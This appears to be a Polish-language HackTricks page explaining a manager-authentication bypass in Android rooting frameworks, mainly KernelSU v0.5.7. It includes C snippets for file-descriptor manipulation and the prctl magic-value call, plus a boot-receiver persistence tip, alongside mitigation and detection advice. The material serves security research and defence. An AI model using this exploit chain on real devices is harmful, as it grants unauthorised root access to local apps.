# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Frameworki rootujące, takie jak KernelSU, APatch, SKRoot i Magisk, często łatają jądro Linux/Android i udostępniają uprzywilejowane funkcje aplikacji "menedżera" w przestrzeni użytkownika za pośrednictwem podłączonego syscall. Jeśli krok uwierzytelniania menedżera jest wadliwy, każda lokalna aplikacja może uzyskać dostęp do tego kanału i podnieść uprawnienia na już zrootowanych urządzeniach.

Ta strona abstrahuje techniki i pułapki odkryte w badaniach publicznych (szczególnie analiza KernelSU v0.5.7 przez Zimperium), aby pomóc zarówno zespołom red, jak i blue w zrozumieniu powierzchni ataku, prymitywów eksploatacji i solidnych środków zaradczych.

---
## Wzorzec architektury: syscall-hooked manager channel

- Moduł/łatka jądra podłącza syscall (zwykle prctl), aby odbierać "komendy" z przestrzeni użytkownika.
- Protokół zazwyczaj wygląda następująco: magic_value, command_id, arg_ptr/len ...
- Aplikacja menedżera w przestrzeni użytkownika najpierw się uwierzytelnia (np. CMD_BECOME_MANAGER). Gdy jądro oznaczy wywołującego jako zaufanego menedżera, akceptowane są uprzywilejowane komendy:
- Przyznaj root wywołującemu (np. CMD_GRANT_ROOT)
- Zarządzaj listami dozwolonymi/zakazanymi dla su
- Dostosuj politykę SELinux (np. CMD_SET_SEPOLICY)
- Zapytaj o wersję/konfigurację
- Ponieważ każda aplikacja może wywoływać syscalls, poprawność uwierzytelniania menedżera jest kluczowa.

Przykład (projekt KernelSU):
- Podłączony syscall: prctl
- Magiczna wartość do przekierowania do handlera KernelSU: 0xDEADBEEF
- Komendy obejmują: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, itd.

---
## Przepływ uwierzytelniania KernelSU v0.5.7 (jak zaimplementowano)

Gdy przestrzeń użytkownika wywołuje prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU weryfikuje:

1) Sprawdzenie prefiksu ścieżki
- Podana ścieżka musi zaczynać się od oczekiwanego prefiksu dla UID wywołującego, np. /data/data/<pkg> lub /data/user/<id>/<pkg>.
- Odniesienie: core_hook.c (v0.5.7) logika prefiksu ścieżki.

2) Sprawdzenie własności
- Ścieżka musi być własnością UID wywołującego.
- Odniesienie: core_hook.c (v0.5.7) logika własności.

3) Sprawdzenie podpisu APK za pomocą skanowania tabeli FD
- Iteruj przez otwarte deskryptory plików (FD) procesu wywołującego.
- Wybierz pierwszy plik, którego ścieżka pasuje do /data/app/*/base.apk.
- Przeanalizuj podpis APK v2 i zweryfikuj go w stosunku do oficjalnego certyfikatu menedżera.
- Odniesienia: manager.c (iteracja FDs), apk_sign.c (weryfikacja APK v2).

Jeśli wszystkie kontrole przejdą, jądro tymczasowo przechowuje UID menedżera i akceptuje uprzywilejowane komendy z tego UID, aż do resetu.

---
## Klasa podatności: zaufanie "pierwszemu pasującemu APK" z iteracji FD

Jeśli sprawdzenie podpisu wiąże się z "pierwszym pasującym /data/app/*/base.apk" znalezionym w tabeli FD procesu, w rzeczywistości nie weryfikuje to pakietu wywołującego. Atakujący może wcześniej umieścić prawidłowo podpisany APK (prawdziwego menedżera), aby pojawił się wcześniej na liście FD niż jego własny base.apk.

To zaufanie przez pośrednictwo pozwala aplikacji bez uprawnień na podszywanie się pod menedżera bez posiadania klucza podpisującego menedżera.

Kluczowe właściwości wykorzystywane:
- Skanowanie FD nie wiąże się z tożsamością pakietu wywołującego; tylko dopasowuje wzorce ciągów ścieżek.
- open() zwraca najniższy dostępny FD. Zamykając najpierw FD o niższych numerach, atakujący może kontrolować kolejność.
- Filtr sprawdza tylko, czy ścieżka pasuje do /data/app/*/base.apk – nie to, że odpowiada zainstalowanemu pakietowi wywołującego.

---
## Warunki wstępne ataku

- Urządzenie jest już zrootowane z podatnym frameworkiem rootującym (np. KernelSU v0.5.7).
- Atakujący może uruchomić dowolny nieuprzywilejowany kod lokalnie (proces aplikacji Android).
- Prawdziwy menedżer jeszcze się nie uwierzytelnił (np. zaraz po ponownym uruchomieniu). Niektóre frameworki przechowują UID menedżera po sukcesie; musisz wygrać wyścig.

---
## Zarys eksploatacji (KernelSU v0.5.7)

Kroki na wysokim poziomie:
1) Zbuduj prawidłową ścieżkę do swojego katalogu danych aplikacji, aby spełnić kontrole prefiksu i własności.
2) Upewnij się, że prawdziwy plik APK menedżera KernelSU jest otwarty na niższym numerze FD niż twój własny base.apk.
3) Wywołaj prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) aby przejść kontrole.
4) Wydaj uprzywilejowane komendy, takie jak CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY, aby utrzymać podniesienie uprawnień.

Praktyczne uwagi dotyczące kroku 2 (kolejność FD):
- Zidentyfikuj FD swojego procesu dla swojego /data/app/*/base.apk, przechodząc przez symlinki /proc/self/fd.
- Zamknij niski FD (np. stdin, fd 0) i najpierw otwórz prawdziwy plik APK menedżera, aby zajmował fd 0 (lub dowolny indeks niższy niż twój własny fd base.apk).
- Spakuj prawdziwy plik APK menedżera z twoją aplikacją, aby jego ścieżka spełniała naiwne filtry jądra. Na przykład umieść go w podścieżce pasującej do /data/app/*/base.apk.

Przykładowe fragmenty kodu (Android/Linux, tylko ilustracyjne):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Wymuś, aby niższy numer FD wskazywał na legalny APK menedżera:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Zarządzanie uwierzytelnianiem za pomocą hooka prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Po sukcesie, polecenia z uprawnieniami (przykłady):
- CMD_GRANT_ROOT: promuj bieżący proces do roota
- CMD_ALLOW_SU: dodaj swój pakiet/UID do listy dozwolonych dla trwałego su
- CMD_SET_SEPOLICY: dostosuj politykę SELinux zgodnie z obsługą przez framework

Wskazówka dotycząca wyścigu/trwałości:
- Zarejestruj odbiornik BOOT_COMPLETED w AndroidManifest (RECEIVE_BOOT_COMPLETED), aby uruchomić się wcześnie po ponownym uruchomieniu i spróbować uwierzytelnienia przed prawdziwym menedżerem.

---
## Wskazówki dotyczące wykrywania i łagodzenia

Dla deweloperów frameworków:
- Powiąż uwierzytelnianie z pakietem/UID wywołującego, a nie z dowolnymi FD:
- Rozwiąż pakiet wywołującego z jego UID i zweryfikuj go w porównaniu z podpisem zainstalowanego pakietu (za pomocą PackageManager), a nie skanując FD.
- Jeśli tylko jądro, użyj stabilnej tożsamości wywołującego (uprawnienia zadania) i zweryfikuj na stabilnym źródle prawdy zarządzanym przez init/użytkownika, a nie FD procesów.
- Unikaj sprawdzania prefiksów ścieżek jako tożsamości; są one trywialnie spełniane przez wywołującego.
- Użyj wyzwania opartego na nonce w odpowiedzi przez kanał i wyczyść wszelkie pamiętane tożsamości menedżera przy uruchomieniu lub przy kluczowych zdarzeniach.
- Rozważ użycie uwierzytelnionego IPC opartego na binderze zamiast przeciążania ogólnych wywołań systemowych, gdy to możliwe.

Dla obrońców/zespół niebieski:
- Wykryj obecność frameworków do rootowania i procesów menedżera; monitoruj wywołania prctl z podejrzanymi magicznymi stałymi (np. 0xDEADBEEF), jeśli masz telemetrię jądra.
- W zarządzanych flotach, blokuj lub alarmuj na odbiorniki uruchamiania z nieufnych pakietów, które szybko próbują poleceń menedżera z uprawnieniami po uruchomieniu.
- Upewnij się, że urządzenia są zaktualizowane do poprawionych wersji frameworków; unieważnij pamiętane identyfikatory menedżera po aktualizacji.

Ograniczenia ataku:
- Dotyczy tylko urządzeń już zrootowanych z podatnym frameworkiem.
- Zazwyczaj wymaga ponownego uruchomienia/okna wyścigu przed uwierzytelnieniem przez prawdziwego menedżera (niektóre frameworki pamiętają UID menedżera do momentu resetu).

---
## Powiązane uwagi w ramach frameworków

- Uwierzytelnianie oparte na haśle (np. historyczne wersje APatch/SKRoot) może być słabe, jeśli hasła są do odgadnięcia/bruteforce'owania lub walidacje są wadliwe.
- Uwierzytelnianie oparte na pakiecie/podpisie (np. KernelSU) jest silniejsze w zasadzie, ale musi być powiązane z rzeczywistym wywołującym, a nie pośrednimi artefaktami, takimi jak skany FD.
- Magisk: CVE-2024-48336 (MagiskEoP) pokazał, że nawet dojrzałe ekosystemy mogą być podatne na fałszowanie tożsamości prowadzące do wykonania kodu z roota w kontekście menedżera.

---
## Odnośniki

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
